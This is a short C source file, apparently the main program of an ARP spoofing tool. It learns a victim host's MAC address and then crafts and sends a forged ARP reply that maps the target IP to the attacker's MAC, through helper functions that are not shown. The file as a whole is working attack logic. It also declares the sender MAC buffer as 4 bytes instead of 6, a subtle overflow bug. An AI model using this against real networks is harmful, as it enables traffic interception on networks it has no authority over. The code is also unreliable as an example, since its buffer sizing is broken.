#include "packet_func.h"

int main(int argc,char* argv[]){

    if(argc!=4){
        printf("Need more argument");
        return -1;
    }

    struct eth_header eth;
    struct arp_header arp;

    u_char mMac[6], senMac[4];
    uint8_t senIp[4], tarIp[4], mIp[4];

    myInfo(argv[1], mMac, mIp);
    atoiArgv(argv[2],senIp);
    atoiArgv(argv[3],tarIp);

    normalArp(mIp,mMac,senIp,argv[1]);
    listenArp(argv[1], senIp, senMac);
    makeAttackArp(mMac, senMac, tarIp, senIp, &eth, &arp);
    attackArp(&eth, &arp,argv[1]);

    return 0;
}
